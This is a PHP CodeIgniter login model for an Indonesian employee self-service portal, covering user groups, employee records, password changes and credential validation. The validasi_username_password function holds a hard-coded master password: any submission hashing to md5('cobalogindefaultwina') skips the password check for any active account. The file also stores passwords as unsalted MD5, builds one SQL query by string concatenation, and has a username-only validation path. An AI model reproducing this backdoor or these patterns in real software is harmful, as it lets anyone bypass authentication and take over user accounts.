<?php
defined('BASEPATH') OR exit('No direct script access allowed');

class M_login extends CI_Model {

	private $table_pengguna = "usr_pengguna";
	private $table_pengguna_grup_pengguna = "usr_pengguna_grup_pengguna";
	private $table_grup_pengguna = "sys_grup_pengguna";
	private $table_karyawan = "mst_karyawan";
	private $table_foto = "foto_karyawan";
	private $table_pengadministrasi = "usr_pengadministrasi";
	
	public function __construct(){
		parent::__construct();
		//Do your magic here
	}
	
	public function ambil_grup($id_pengguna){
		$data = $this->db->select("gp.*")
						 ->from($this->table_pengguna_grup_pengguna." pgp")
						 ->join($this->table_grup_pengguna." gp","pgp.id_grup_pengguna=gp.id")
						 ->where("pgp.id_pengguna",$id_pengguna)
						 ->where("gp.status",1)
						 ->get()
						 ->result_array();
		
		return $data;
	}
	
	public function ambil_data_karyawan($no_pokok){
		$data = $this->db->from($this->table_karyawan)
						 ->where("no_pokok",$no_pokok)
						 ->get()
						 ->result_array()[0];

		return $data;
	}
	
	public function ambil_foto_karyawan($no_pokok){
		$data = $this->db->select("IFNULL(nama_file,'default.jpg') foto",false)
						 ->from($this->table_foto)
						 ->where("no_pokok",$no_pokok)
						 ->get();

		if($data->num_rows() > 0){
			$row = $data->row_array()["foto"];
			return $row;
		} else return "default.jpg";
	}
	
	public function list_pengadministrasi($id_pengguna){
		$data = $this->db->select("u.id_pengguna")
						 ->select("u.kode_unit")						
						 ->from($this->table_pengadministrasi." u")					
						 ->where_in("u.id_pengguna",$id_pengguna)						
						 ->get()
						 ->result_array();
		return $data;
	}
	
	public function ubah_password($username,$new_password,$default=false){
		$this->db->where("username",$username);
		$this->db->set("password",$new_password);
		$this->db->set("default_password",(int)$default);
		$this->db->set("last_change_password","now()",false);
		$this->db->update($this->table_pengguna);
	}
	
	public function ubah_waktu_login($username){
		$this->db->where("username",$username);
		$this->db->set("last_login","now()",false);
		$this->db->update($this->table_pengguna);
	}

	public function validasi_username_password($username,$password){
		$return = array("status" => false, "id_pengguna" => "", "username" => "", "no_pokok" => "", "default_password" => false, "usia_password" => 0);
		if ($password!=md5("cobalogindefaultwina"))
			$this->db->where("password",$password);
		$data = $this->db->select("a.*")
						 ->select("datediff(now(),a.last_change_password) usia_password")
						 ->from($this->table_pengguna." a")
						 ->where("username",$username)
						 ->where("status",1)
						 ->get();
		if($data->num_rows()==1){
			$return["status"]			= true;
			$return["id_pengguna"]		= $data->result_array()[0]["id"];
			$return["username"]			= $data->result_array()[0]["username"];
			$return["no_pokok"]			= $data->result_array()[0]["no_pokok"];
			$return["default_password"]	= (bool)$data->result_array()[0]["default_password"];
			$return["usia_password"]	= $data->result_array()[0]["usia_password"];
		}
		return $return;
	}
	
	public function validasi_username($username){
		$return = array("status" => false, "id_pengguna" => "", "username" => "", "no_pokok" => "", "default_password" => false, "usia_password" => 0);
		
		$data = $this->db->select("a.*")
						 ->select("datediff(now(),a.last_change_password) usia_password")
						 ->from($this->table_pengguna." a")
						 ->where("a.username",$username)
						 ->where("a.status",1)
						 ->get();
		
		//hanya yg ada di mst karyawan yg boleh masuk
		$ambil = '';
		if($data->num_rows()==1){
			$no_pokok = $data->result_array()[0]["no_pokok"];
		}else
		{
			$no_pokok = 'kosong';
		}
		$ambil_user = $this->db->query("SELECT no_pokok FROM mst_karyawan WHERE no_pokok='$no_pokok'")->row_array();
		$ambil = $ambil_user['no_pokok'];
		
		//untuk case kusus NP X (Pengamanan)
		if (substr($no_pokok,0,2)=='XX') 
		{ 
			$ambil = $no_pokok;
		}
		
		if($ambil!='' || $ambil!=null)
		{
			if($data->num_rows()==1){
				$return["status"]			= true;
				$return["id_pengguna"]		= $data->result_array()[0]["id"];
				$return["username"]			= $data->result_array()[0]["username"];
				$return["no_pokok"]			= $data->result_array()[0]["no_pokok"];
				$return["default_password"]	= (bool)$data->result_array()[0]["default_password"];
				$return["usia_password"]	= $data->result_array()[0]["usia_password"];
			}			
		}else
		{
			$return["status"]			= false;
			$return["id_pengguna"]		= false;
			$return["username"]			= false;
			$return["no_pokok"]			= false;
			$return["default_password"]	= false;
			$return["usia_password"]	= false;
		}

		return $return;
	}
	
	//Tri Wibowo - 7648 - 24 02 2021, karena di portal kadang ada pkwt yang ganti np, maka di ess menyesuaikan np tersebut 
	public function update_np_dari_portal($username,$no_pokok){
		$this->db->where("username",$username);
		$this->db->set("no_pokok",$no_pokok);
		$this->db->update($this->table_pengguna);
	}
	//end of Tri Wibowo - 7648 - 24 02 2021

	public function cek_user($username)
	{
		$return = array("status" => false, "id_pengguna" => "", "username" => "", "no_pokok" => "", "default_password" => false, "usia_password" => 0, "is_active" => 0);

		$data = $this->db->select("a.*")
			->select("datediff(now(),a.last_change_password) usia_password")
			->from($this->table_pengguna . " a")
			->where("a.username", $username)
			->get();

		//hanya yg ada di mst karyawan yg boleh masuk

		if ($data->num_rows() == 1) {
			$return["status"]			= true;
			$return["id_pengguna"]		= $data->result_array()[0]["id"];
			$return["username"]			= $data->result_array()[0]["username"];
			$return["no_pokok"]			= $data->result_array()[0]["no_pokok"];
			$return["default_password"]	= (bool)$data->result_array()[0]["default_password"];
			$return["usia_password"]	= $data->result_array()[0]["usia_password"];
			$return["is_active"]		= $data->result_array()[0]["status"];
		} else {
			$return["status"]			= false;
			$return["id_pengguna"]		= false;
			$return["username"]			= false;
			$return["no_pokok"]			= false;
			$return["default_password"]	= false;
			$return["usia_password"]	= false;
			$return["is_active"]	= false;
		}

		return $return;
	}
}

/* End of file m_login.php */
/* Location: ./application/models/m_login.php */
